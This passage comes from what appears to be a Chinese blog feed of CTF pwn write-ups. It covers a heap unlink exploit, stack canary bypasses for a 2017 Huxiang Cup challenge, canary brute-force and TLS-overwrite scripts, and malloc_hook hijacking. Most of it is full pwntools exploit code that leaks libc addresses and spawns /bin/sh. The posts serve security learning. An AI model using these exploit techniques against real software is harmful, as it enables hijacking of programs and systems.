title="8.数据库基础"></a>8.数据库基础</h2><h3 id="8-1-关系型数据库"><a href="#8-1-关系型数据库" class="headerlink" title="8.1 关系型数据库"></a>8.1 关系型数据库</h3><h3 id="8-2-NOSQL"><a href="#8-2-NOSQL" class="headerlink" title="8.2 NOSQL"></a>8.2 NOSQL</h3><h3 id="8-3-常用数据库"><a href="#8-3-常用数据库" class="headerlink" title="8.3 常用数据库"></a>8.3 常用数据库</h3><h3 id="8-4-数据库"><a href="#8-4-数据库" class="headerlink" title="8.4 数据库"></a>8.4 数据库</h3><h3 id="8-5-数据表"><a href="#8-5-数据表" class="headerlink" title="8.5 数据表"></a>8.5 数据表</h3><h3 id="8-6-索引"><a href="#8-6-索引" class="headerlink" title="8.6 索引"></a>8.6 索引</h3><h3 id="8-7-SQL基础"><a href="#8-7-SQL基础" class="headerlink" title="8.7 SQL基础"></a>8.7 SQL基础</h3>]]></content>
      
      
      <categories>
          
          <category> C++后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> 计网 </tag>
            
            <tag> 编译原理 </tag>
            
            <tag> sql </tag>
            
            <tag> 数据结构和算法 </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unlink</title>
      <link href="/2023/04/25/unlink/"/>
      <url>/2023/04/25/unlink/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-none"><code class="language-none">#coding:utf-8from pwn import *context(arch&#x3D;&#39;amd64&#39;,os&#x3D;&#39;linux&#39;)context.log_level &#x3D; &#39;debug&#39;io &#x3D; process(&#39;.&#x2F;stkof&#39;)elf &#x3D; ELF(&#39;.&#x2F;stkof&#39;)libc &#x3D; ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)def alloc(size):io.sendline(&#39;1&#39;)io.sendline(str(size))io.recvuntil(&#39;OK\n&#39;)def edit(index,size,content):io.sendline(&#39;2&#39;)io.sendline(str(index))io.sendline(str(size))io.send(content)#之所以用send是因为如果sendline的话会多读入一个&#39;\n&#39;#导致size和content的长度不匹配，导致错误io.recvuntil(&#39;OK\n&#39;)def free(index):io.sendline(&#39;3&#39;)io.sendline(str(index))head &#x3D; 0x602140#这是全局数组s的地址#ctf-wiki介绍说，由于程序本身没有进行 setbuf 操作，所以在执行输入输出操作的时候会申请缓冲区#而实际查看情况也的确如此，但是本身对做题没有太大的影响alloc(0x10)#第一块#这里ctf-wiki上的exp是0x100，而我是0x10，因为这个大小并没有影响alloc(0x30) #第二块#这里最少也要这么大alloc(0x80)#第三块payload &#x3D; p64(0)+p64(0x20)+p64(head+16-0x18)+p64(head+16-0x10)+p64(0x20)payload &#x3D; payload.ljust(0x30,&#39;a&#39;)payload +&#x3D; p64(0x30)+p64(0x90)edit(2,len(payload),payload)#在0x30的块中，构造一个size为0x20，fd&#x3D;head+16-0x18，bk&#x3D;head+16-0x10 的块#并在之后再构造下一个块的prev_size&#x3D;0x20#为什么要构造prev_size&#x3D;20呢#因为unlink的时候会有一个检查：#__builtin_expect (chunksize(P) !&#x3D; prev_size (next_chunk(P)), 0)#如果不等会报错#然后填充到长度为0x30，然后溢出到下一个0x80的块#在这个块中构造prev_size&#x3D;0x30，size&#x3D;0x90#注意：这里的prev_size并不是前一块的size，而是我们构造的块与这一块的偏移#是为了能在unlink的时候找到的是我们构造的块#注意：这个块的prev_inuse为0，即size的最后一位为0，代表前一块是空闲的状态，未分配#gdb.attach(io,&#39;b *0x400B42&#39;)#raw_input(&#39;en: \n&#39;)free(3)#执行free(3)，即free我们填充的size为0x90的块，这时候，由_int_free函数中的#        if (!prev_inuse(p)) &#123;#            prevsize &#x3D; prev_size(p);#            size +&#x3D; prevsize;#            p &#x3D; chunk_at_offset(p, -((long) prevsize));#            unlink(av, p, bck, fwd);#        &#125;#就会对后面的块即我们构造的块进行unlink#unlink的具体事项ctf-wiki在这一章讲的非常详细io.recvuntil(&#39;OK\n&#39;)free_got &#x3D; elf.got[&#39;free&#39;]puts_got &#x3D; elf.got[&#39;puts&#39;]atoi_got &#x3D; elf.got[&#39;atoi&#39;]puts_plt &#x3D; elf.plt[&#39;puts&#39;]payload &#x3D; p64(0)+p64(free_got)+p64(puts_got)+p64(atoi_got)edit(2,len(payload),payload)#因为此时的第二块指的是head-8，所以首先要填充8位#然后修改s[0]&#x3D;free_got，s[1]&#x3D;puts_got，s[2]&#x3D;atoi_gotpayload &#x3D; p64(puts_plt)edit(0,len(payload),payload)#这样就可以修改 *s[0]即*free_got&#x3D;puts_plt#之后再调用free函数的时候就会调用puts了free(1)#free(1)就相当于puts(s[1])，就会泄露puts函数的地址#利用这个地址以及libc，可以计算出libc_base，以及system_addrleak &#x3D; io.recvuntil(&#39;\nOK\n&#39;)[:6]puts_addr &#x3D; u64(leak.ljust(8,&#39;\x00&#39;))log.success(&#39;puts addr: &#39;+hex(puts_addr))libc_base &#x3D; puts_addr - libc.symbols[&#39;puts&#39;]log.success(&#39;libc_base: &#39;+hex(libc_base))sys_addr &#x3D; libc_base + libc.symbols[&#39;system&#39;]log.success(&#39;sys_addr: &#39;+hex(sys_addr))payload &#x3D; p64(sys_addr)edit(2,len(payload),payload)#这里，使s[2]即*atoi_got&#x3D;sys_addr#之后再调用atoi的时候就相当于调用system#但是&#x2F;bin&#x2F;sh呢？#gdb.attach(io,&#39;b *0x400D29&#39;)#raw_input(&#39;en: &#39;)payload &#x3D; &#39;&#x2F;bin&#x2F;sh\x00&#39;io.sendline(payload)#其实atoi这个函数是在主函数中把我们输入的选项的字符转换成数字的，且可输入的大小有10字节#我们就可以直接输入&#x2F;bin&#x2F;sh字符串，然后当成atoi即system的参数执行，即可getshell#这里ctf-wiki中用的是&#x2F;bin&#x2F;sh字符串在libc的地址，其实是不对的io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
            <tag> unlink </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>canary</title>
      <link href="/2023/04/25/canary/"/>
      <url>/2023/04/25/canary/</url>
      
        <content type="html"><![CDATA[<h2 id="1-canary保护"><a href="#1-canary保护" class="headerlink" title="1.canary保护"></a>1.canary保护</h2><p>栈溢出保护是一种用缓冲区溢出攻击环节手段，当函数存在缓冲区溢出漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候就会向往栈里插入cookie信息，当函数真正返回的时候回验证cookie信息是否合法，若果不合法就会停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败，而阻止shellcode的执行，在Linux中将cookie信息称为canary。<br>当开启栈溢出时不可以覆盖最后的canary内容，但是可以对canary前面进行溢出</p><p>gcc用法：</p><pre class="line-numbers language-none"><code class="language-none">gcc -o test test.c &#x2F;&#x2F; 默认情况下，不开启Canary保护gcc -fno-stack-protector -o test test.c &#x2F;&#x2F;禁用栈保护gcc -fstack-protector -o test test.c &#x2F;&#x2F;启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码gcc -fstack-protector-all -o test test.c &#x2F;&#x2F;启用堆栈保护，为所有函数插入保护代码-fno-stack-protector &#x2F;-fstack-protector &#x2F; -fstack-protector-all (关闭 &#x2F; 开启 &#x2F; 全开启)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://blog.csdn.net/qq_41202237/article/details/105913071">原文链接</a></p><h2 id="2-stack-smash"><a href="#2-stack-smash" class="headerlink" title="2.stack smash"></a>2.stack smash</h2><p>参考：<a href="https://hollk.blog.csdn.net/article/details/107628831?spm=1001.2014.3001.5502">https://hollk.blog.csdn.net/article/details/107628831?spm=1001.2014.3001.5502</a></p><p>在程序加载了canary保护之后如果我们是在覆盖缓冲区的时候就会连带着覆盖了canary保护的cookie，这个时候程序就会报错。但是这个技术并不在乎是否报错，而是在乎报错的内容。stack smash技巧就是利用打印这一信息的程序来得到我们想要的内容。这是因为在程序启动canary保护之后，如果发现canary被修改的话就会执__stack_chk_fail函数来打印argv[0]指针所指向的字符串，正常情况下这个指针指向程序名。代码如下：</p><pre class="line-numbers language-none"><code class="language-none">void __attribute__ ((noreturn)) __stack_chk_fail (void)&#123;  __fortify_fail (&quot;stack smashing detected&quot;);&#125;void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)&#123;  &#x2F;* The loop is added only to keep gcc happy.  *&#x2F;  while (1)    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用栈溢出覆盖argv[0]为我们想要输出的字符串地址，那么在__fortify_fail函数中就会输出我们想要的信息</p><h2 id="3-2017湖湘杯Pwn100"><a href="#3-2017湖湘杯Pwn100" class="headerlink" title="3.2017湖湘杯Pwn100"></a>3.2017湖湘杯Pwn100</h2><p><a href="https://github.com/eternalsakura/ctf_pwn/tree/master/%E6%B9%96%E6%B9%98%E6%9D%AF2017/pwn100h">题目链接</a></p><h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><pre class="line-numbers language-none"><code class="language-none"># -*- coding: utf-8 -*-from pwn import *    #调用pwn模块import binascii     #binascii模块包含很多在二进制和ASCII编码的二进制表示转换的方法import base64     #base64的编码解码 def main():    debug &#x3D; 2    if debug &#x3D;&#x3D; 1:        io &#x3D; process(&#39;.&#x2F;pwns&#39;)  # io  处理各种类型的I&#x2F;O操作流         #  process()  可以打开一个本地程序并进行交互，开始一个进程        gdb.attach(io, &#39;&#39;&#39;       b *main       &#39;&#39;&#39;)    #附加调试器    elif debug &#x3D;&#x3D; 2:        io &#x3D; process(&#39;.&#x2F;pwns&#39;)  #开始一个进程    else:        # nc -l -p 4546 -e .&#x2F;pwns        io &#x3D; remote(&#39;127.0.0.1&#39;, 4546)   #创建到远程主机的TCP或UDP连接。它支持IPv4和IPv6。    #context.log_level &#x3D; &#39;debug&#39;    # gdb.attach(s,&#39;b *0x080485c7&#39;)    context(arch&#x3D;&#39;i386&#39;, os&#x3D;&#39;linux&#39;)         #设置运行时变量，选定的目标操作系统，体系结构，i386是intel的较早期的32位处理器的名称     io.recvuntil(&quot;May be I can know if you give me some data[Y&#x2F;N]&quot;)  #接受到这个字符串    io.send(&#39;Y&#39;+&#39;\n&#39;)   #向进程发送输入 ‘Y’    # io.sendline(&#39;Y&#39;)     #区别：send(data) : 发送数据  ，而 sendline(data) : 发送一行数据，相当于在末尾加\n    io.recvuntil(&quot;Give me some datas:&quot;)    payload&#x3D;  base64.b64encode(&#39;A&#39;*258)   #258个base64编码的A为payload的值    #通过base64的编码之后，一共344个字节    io.sendline(payload)    #将构造的数据发出去    #recv &#x3D; io.recvuntil(&#39;Finish!&#39;)    print io.recv()      #输出接收到的数据    recv&#x3D; io.recv()    canary &#x3D; &#39;\x00&#39;+recv[recv.rfind(&#39;AAAAAA&#39;)+6:recv.rfind(&#39;AAAAAA&#39;)+9]     #rfind() 返回字符串最后一次出现的位置    #实际canary的长度为4字节，但最低字节为‘\x00’，找到最后一个出现&#39;AAAAAA&#39;的位置，并将这个位置后面的三个字符切片出来，赋值给变量canary    print canary      #获取canary结束    #成功理解    elf&#x3D;ELF(&#39;.&#x2F;pwns&#39;)    #elf为  文件装载的基地址    #ELF模块用于获取ELF文件的信息，首先使用ELF()获取这个文件的句柄，然后使用这个句柄调用函数    setbuf_got&#x3D; elf.got[&#39;setbuf&#39;]   #got 获取指定函数的GOT条目，定位全局变量    puts_plt &#x3D; elf.plt[&#39;puts&#39;]         #plt 获取指定函数的PLT条目，定位过程的数据信息    #GOT(Global Offset Table)和PLT(Procedure Linkage Table)是Linux系统下面ELF格式的可执行文件中，用于定位全局变量和过程的数据信息      io.recvuntil(&quot;May be I can know if you give me some data[Y&#x2F;N]&quot;)    io.send(&#39;Y&#39;+&#39;\n&#39;)    # io.sendline(&#39;Y&#39;)         io.recvuntil(&quot;Give me some datas:&quot;)    #主要是对整数进行打包，就是转换成二进制的形式，比如转换成地址。p32、p64是打包，u32、u64是解包。    payload &#x3D; base64.b64encode(&#39;A&#39; * 257 + canary + &#39;A&#39; * 12 + p32(puts_plt) + &#39;A&#39; * 4 + p32(setbuf_got))    io.sendline(payload)#将构造的数据发出去    #recv &#x3D; io.recvuntil(&#39;Finish!&#39;)    print io.recv()    recv&#x3D; io.recv()    print recv    setbuf_addr &#x3D; u32(recv[recv.rfind(&#39;AAAAAA&#39;)+7:recv.rfind(&#39;AAAAAA&#39;)+11])    print setbuf_addr   #获取setbuf在运行时的实际地址     elf&#x3D; ELF(&#39;&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc.so.6&#39;) #动态加载把题目所给的动态链接库加载起来    system_offset&#x3D;elf.symbols[&quot;system&quot;]    #system偏移地址    setbuf_offset&#x3D;elf.symbols[&quot;setbuf&quot;]     #setbuf偏移地址    system_addr&#x3D;setbuf_addr+system_offset-setbuf_offset     #system_addr-setbuf_addr&#x3D;system_offset-setbuf_offset     binsh_offset&#x3D;0x15cd28  #strings -a -tx &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc.so.6 | grep &quot;&#x2F;bin&#x2F;sh&quot;    binsh_addr &#x3D; setbuf_addr+binsh_offset-setbuf_offset     io.recvuntil(&quot;May be I can know if you give me some data[Y&#x2F;N]&quot;)    io.send(&#39;Y&#39;+&#39;\n&#39;)    # io.sendline(&#39;Y&#39;)    io.recvuntil(&quot;Give me some datas:&quot;)    payload &#x3D; base64.b64encode(&#39;A&#39; * 257 + canary + &#39;A&#39; * 12 + p32(system_addr) + &#39;A&#39; * 4 + p32(binsh_addr))    io.sendline(payload)  #将构造的数据发出去     #recv &#x3D; io.recvuntil(&#39;Finish!&#39;)    #print io.recv()    #recv&#x3D; io.recv()    io.interactive()   #直接进行交互，相当于回到shell的模式，在取得shell之后使用      a&#x3D; raw_input(&quot;pause&quot;)  #运行结束后暂停在这里，向控制台输出pause if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    main()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&#x2F;&#x2F;PS</p><pre class="line-numbers language-none"><code class="language-none">io.recvuntil(&quot;Give me some datas:&quot;)payload&#x3D;  base64.b64encode(&#39;A&#39;*258)   #258个base64编码的A为payload的值#通过base64的编码之后，一共344个字节io.sendline(payload)    #将构造的数据发出去#recv &#x3D; io.recvuntil(&#39;Finish!&#39;)print io.recv()      #输出接收到的数据recv&#x3D; io.recv()canary &#x3D; &#39;\x00&#39;+recv[recv.rfind(&#39;AAAAAA&#39;)+6:recv.rfind(&#39;AAAAAA&#39;)+9]     #rfind() 返回字符串最后一次出现的位置#实际canary的长度为4字节，但最低字节为‘\x00’，取最后的‘AAAAAA’在字符串之间的位置，向后偏移6，取三个字符print canary  #获取canary结束#成功理解***等价于***p.recvuntil(&quot;Give me some datas:\n&quot;) #这里必须加&quot;\n&quot;payload&#x3D;b&#39;a&#39;*int(258*4&#x2F;3)p.sendine(payload)p.recvline() #接收了&#39;\n&#39;（&#39;\n&#39;用printf打印出来的时候占一整排，用recvline接收正好）canary &#x3D;p.recv()[268:271] #len(&#39;Result is:&#39;)+258，接收3字节（没有&quot;\x00&quot;）canary&#x3D;&quot;\x00&quot;+canaryprint(&quot;canary &gt;&gt; &quot; +canary)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&#x2F;&#x2F;PS</p><blockquote><p>canary &#x3D; ‘\x00’+recv[recv.rfind(‘AAAAAA’)+6:recv.rfind(‘AAAAAA’)+9]</p></blockquote><p>找到最后一个出现’AAAAAA’的位置，并将这个位置后面的三个字符切片出来，赋值给变量canary</p><p>原文链接：<br><a href="https://blog.csdn.net/aptx4869_li/article/details/78877216">https://blog.csdn.net/aptx4869_li/article/details/78877216</a><br><a href="https://ywhkkx.github.io/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/">https://ywhkkx.github.io/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/</a></p><p><a href="https://blog.csdn.net/irwin_chen/article/details/9360845">base64 c语言实现</a></p><h3 id="exp2-爆破canary"><a href="#exp2-爆破canary" class="headerlink" title="exp2(爆破canary)"></a>exp2(爆破canary)</h3><pre class="line-numbers language-none"><code class="language-none">from pwn import *from base64 import *elf &#x3D; ELF(&#39;pwns&#39;)# libc &#x3D; ELF(&#39;libc.so.6&#39;)libc&#x3D;ELF(&#39;&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc.so.6&#39;)puts_plt_addr &#x3D; elf.plt[&#39;puts&#39;]puts_got_addr &#x3D; elf.got[&#39;puts&#39;]vulc_addr &#x3D; 0x080487E6p &#x3D; process(&#39;.&#x2F;pwns&#39;)#爆破函数canary &#x3D; &#39;\x00&#39;p.recvuntil(&#39;May be I can know if you give me some data[Y&#x2F;N]\n&#39;)for i in xrange(3):    for j in xrange(256):        p.send(&#39;Y\n&#39;)        p.send(b64encode(&#39;a&#39;*257+ canary + chr(j)))        recv &#x3D;p.recvuntil(&#39;May be I can know if you give me some data[Y&#x2F;N]\n&#39;)        if &#39;Finish&#39; in recv:            canary +&#x3D; chr(j)            breakprint &#39;find canary:&#39;+canary.encode(&#39;hex&#39;)payload1 &#x3D; &#39;a&#39;*257+ canary +&#39;a&#39;*12+flat(puts_plt_addr,vulc_addr,puts_got_addr)p.send(&#39;Y\n&#39;)p.recvuntil(&#39;Give me some datas:\n\n&#39;)p.send(b64encode(payload1))puts_addr &#x3D; p.recv()[268:268+4]system_addr &#x3D; libc.symbols[&#39;system&#39;] - libc.symbols[&#39;puts&#39;] + u32(puts_addr)sh_addr &#x3D; next(libc.search(&#39;&#x2F;bin&#x2F;sh&#39;))- libc.symbols[&#39;puts&#39;] + u32(puts_addr)p.send(&#39;Y\n&#39;)p.send(&#39;Y\n&#39;)payload2 &#x3D; &#39;a&#39;*257+canary+&#39;a&#39;*12+flat(system_addr,p32(1),sh_addr)p.send(b64encode(payload2))p.interactive(<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://bbs.kanxue.com/thread-224643.htm">原文链接</a></p><h2 id="4-爆破模板"><a href="#4-爆破模板" class="headerlink" title="4.爆破模板"></a>4.爆破模板</h2><pre class="line-numbers language-none"><code class="language-none">void getflag(void) &#123;    char flag[100];    FILE *fp &#x3D; fopen(&quot;.&#x2F;flag&quot;, &quot;r&quot;);    if (fp &#x3D;&#x3D; NULL) &#123;        puts(&quot;get flag error&quot;);exit(0);    &#125;       fgets(flag, 100, fp);    puts(flag);&#125;void init() &#123;    setbuf(stdin, NULL);    setbuf(stdout, NULL);    setbuf(stderr, NULL);&#125;void fun(void) &#123;    char buffer[100];    read(STDIN_FILENO, buffer, 120);&#125;int main(void) &#123;    init();pid_t pid;while(1) &#123;pid &#x3D; fork();&#x2F;&#x2F;fork开启子进程if(pid &lt; 0) &#123;puts(&quot;fork error&quot;);exit(0);&#125;else if(pid &#x3D;&#x3D; 0) &#123;puts(&quot;welcome&quot;);fun();puts(&quot;recv sucess&quot;);&#125;else &#123;wait(0);&#125;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp模板</p><pre class="line-numbers language-none"><code class="language-none">from pwn import *context.log_level &#x3D; &#39;debug&#39;cn &#x3D; process(&#39;.&#x2F;bin&#39;)padding &#x3D; &#39;a&#39;*100cn.recvuntil(&#39;welcome\n&#39;)canary &#x3D; &#39;\x00&#39;for j in range(3):     for i in range(0x100):        cn.send( padding + canary + chr(i))         a &#x3D; cn.recvuntil(&#39;welcome\n&#39;)        if &#39;recv&#39; in a:            canary +&#x3D; chr(i)            breakcn.sendline(&#39;a&#39;*100 + canary + &#39;a&#39;*12 + p32(0x0804864d))flag &#x3D; cn.recv()cn.close()log.success(&#39;flag is:&#39; + flag)#32位为‘3’,64位为‘7’<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-覆盖TLS中储存的canary值"><a href="#5-覆盖TLS中储存的canary值" class="headerlink" title="5.覆盖TLS中储存的canary值"></a>5.覆盖TLS中储存的canary值</h2><p>canary的值存储在fs:[0x28]中</p><p>fs寄存器是由glibc定义的，存放Thread Local Storage （TLS）信息</p><p>该结构体如下所示：</p><pre class="line-numbers language-none"><code class="language-none">typedef struct&#123;        void *tcb;        &#x2F;* Pointer to the TCB.  Not necessarily the                             thread descriptor used by libpthread.  *&#x2F;        dtv_t *dtv;        void *self;        &#x2F;* Pointer to the thread descriptor.  *&#x2F;        int multiple_threads;        int gscope_flag;        uintptr_t sysinfo;        uintptr_t stack_guard;   &#x2F;* canary，0x28偏移 *&#x2F;        uintptr_t pointer_guard;        ……&#125; tcbhead_t;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个 <strong>stack_guard</strong>是在 <strong>libc_start_main</strong> 中进行设置和赋值的</p><p>一般来说，我们不知道TLS的位置，需要爆破脚本来找出：</p><pre class="line-numbers language-none"><code class="language-none">offset&#x3D;1while True:    p &#x3D; process(&#39;.&#x2F;xxxx&#39;)    p.recvuntil(&quot;xxxx&quot;)    payload &#x3D; &#39;&#39;       payload +&#x3D; (padding-8)      #padding    payload +&#x3D; &#39;aaaaaaaa&#39;     #fake canary     payload +&#x3D; p64(0xdeadbeef) #rbp    payload +&#x3D; p64(0)    #返回地址    payload +&#x3D; &#39;a&#39;*(offset-len(payload))    p.send(payload)    temp &#x3D; p.recvall()    if &quot;xxxx&quot; in temp:        print(offset)        p.close()        break    else:        offset +&#x3D; 1        p.close()&quot;&quot;&quot;&quot;原本程序覆盖了canary是一定会报错的，但是payload后续填入的“a”可能会覆盖TLS，使程序通过canary只要程序通过了canary，‘p.recvall()’就会不接受到报错信息（stack_chk_fail）这之后我们就可以通过打印出的offset来计算偏移了&quot;&quot;&quot;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当然也可以不找偏移，直接一次性填入非常长的“a”也是可以覆盖的</p><p>覆盖TLS的方法只能在有“pthread_create”的题中可以用用，不然程序就很可能会覆盖关键数据，然后直接挂掉</p><p>参考：<br><a href="https://ywhkkx.github.io/2022/01/04/pwn%E7%A9%BFcanary/">https://ywhkkx.github.io/2022/01/04/pwn%E7%A9%BFcanary/</a><br><a href="https://forum.butian.net/share/1190">https://forum.butian.net/share/1190</a></p><h2 id="6-劫持-stack-chk-fail函数"><a href="#6-劫持-stack-chk-fail函数" class="headerlink" title="6 劫持__stack_chk_fail函数"></a>6 劫持__stack_chk_fail函数</h2><p>ZCTF2017 —Login</p><p>题解：<a href="http://futurehacker.tech/archives/pwn-zctf2017-login">http://futurehacker.tech/archives/pwn-zctf2017-login</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
            <tag> canary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hook</title>
      <link href="/2023/04/18/hook/"/>
      <url>/2023/04/18/hook/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Hook直意为钩子又叫做回调函数，是一种特殊的消息处理机制，它可以监视系统或者进程中的各种事件消息，截获发往目标窗口的消息并进行处理</p><p>在程序中设置钩子，用来在<code>malloc</code>， <code>realloc</code>，<code>free</code>的时候，对其进行检查，可以看到对应的函数调用后的地址是什么</p><p>原理：</p><p>函数的指针可以指向不同的函数，从而完成不同的功能</p><p>设计理念：</p><p>我们在写main函数的时候，可能还不知道它会完成什么功能，这时候留下函数指针作为接口，可以挂上不同的函数完成不同的功能，究竟执行什么功能由钩子函数的编写者完成</p><p>案例：</p><pre class="line-numbers language-none"><code class="language-none">#include &quot;stdio.h&quot; void fun1(void)&#123;    printf(&quot;i am fun1\r\n&quot;);&#125; void fun2(void)&#123;    printf(&quot;i am fun2\r\n&quot;);&#125; int main(int argc, char const *argv[])&#123;    void (* fun)(void); &#x2F;&#x2F;定义一个函数指针      fun &#x3D; fun1;&#x2F;&#x2F; 让fun指向fun1（首地址）    fun();&#x2F;&#x2F; 执行fun        fun &#x3D; fun2;   &#x2F;&#x2F; 让fun指向fun2（首地址）    fun(); &#x2F;&#x2F; 执行fun     return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果：<br><img src="https://ywhkkx.github.io/2021/12/12/%E5%A0%86%E6%BA%A2%E5%87%BA+malloc_hook%E5%8A%AB%E6%8C%81/1638893957283-1639312427470.png"></p><p>这里的函数“fun1”和函数“fun2”就是hook</p><p>把函数指针fun指向fun1和fun2的过程称为“挂钩子”</p><p>​ &#x2F;&#x2F; 在嵌入式系统中，底层不知道应用层需要完成什么功能， 往往会提供像这样子的函数回调方式供应用层使用</p><h2 id="malloc-hook"><a href="#malloc-hook" class="headerlink" title="malloc_hook"></a>malloc_hook</h2><p>malloc_hook本质上讲是一个指针变量，指向一个“检查函数”</p><blockquote><p>void * function(size_t size, void * caller)<br>​ &#x2F;&#x2F;其中caller是表示在栈中调用malloc的函数的时候的函数地址，%p可以打印出它的地址</p></blockquote><p>在执行malloc时，会检测__malloc_hook的值，如果malloc_hook的值存在（已经挂钩），将调用malloc_hook指向的call rax的地址（malloc调用之后的地址）</p><p>简单来说：执行malloc时，malloc_hook也会执行</p><p>案例：</p><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;#include &lt;malloc.h&gt;void *fun() &#123;    __malloc_hook &#x3D; NULL;    printf(&quot;hello,fun was called!\n&quot;);    return NULL;&#125;int main() &#123;    __malloc_hook &#x3D; fun;    malloc(10);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>malloc_hook指向了fun的首地址（挂钩子）</p><p>程序在执行malloc时就会执行fun，而不是“检查函数”（钩子已切换）</p><p>利用：</p><p>malloc_hook位于main_arena上方0x10的位置，可以通过fake chunk来overwrite该值实现getshell<br><a href="https://ywhkkx.github.io/2021/12/12/%E5%A0%86%E6%BA%A2%E5%87%BA+malloc_hook%E5%8A%AB%E6%8C%81/">上面参考yhellow</a><br><a 